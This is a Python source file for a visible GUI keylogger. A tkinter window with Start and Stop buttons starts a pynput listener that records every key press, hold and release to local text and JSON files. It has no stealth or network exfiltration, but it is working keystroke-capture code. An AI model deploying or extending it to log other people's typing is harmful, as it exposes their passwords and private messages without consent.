import tkinter as tk
from pynput import keyboard
import json

keys_used = []
flag = False
keys = ""

def generate_text_log(key):
    try:
        with open('key_log.txt', "w") as keys_file:
            keys_file.write(key)
    except Exception as e:
        print(f"Error writing to text log: {e}")

def generate_json_file(keys_used):
    try:
        with open('key_log.json', 'w') as key_log:
            json.dump(keys_used, key_log, indent=4)
    except Exception as e:
        print(f"Error writing to JSON file: {e}")

def on_press(key):
    global flag, keys_used
    try:
        if not flag:
            keys_used.append({'Pressed': f'{key}'})
            flag = True
        else:
            keys_used.append({'Held': f'{key}'})
        generate_json_file(keys_used)
    except Exception as e:
        print(f"Error on_press: {e}")

def on_release(key):
    global flag, keys_used, keys
    try:
        keys_used.append({'Released': f'{key}'})
        if flag:
            flag = False
        generate_json_file(keys_used)
        keys += str(key).replace("'", "")
        generate_text_log(keys)
    except Exception as e:
        print(f"Error on_release: {e}")

def start_keylogger():
    global listener
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()
    label.config(text="[+] Keylogger is running!\n[!] Saving the keys in 'key_log.txt'")
    start_button.config(state='disabled')
    stop_button.config(state='normal')

def stop_keylogger():
    global listener
    listener.stop()
    label.config(text="Keylogger stopped.")
    start_button.config(state='normal')
    stop_button.config(state='disabled')

root = tk.Tk()
root.title("Keylogger")

label = tk.Label(root, text='Click "Start" to begin keylogging.')
label.config(anchor=tk.CENTER)
label.pack()

start_button = tk.Button(root, text="Start", command=start_keylogger)
start_button.pack(side=tk.LEFT)

stop_button = tk.Button(root, text="Stop", command=stop_keylogger, state='disabled')
stop_button.pack(side=tk.RIGHT)

root.geometry("300x150")

root.mainloop()
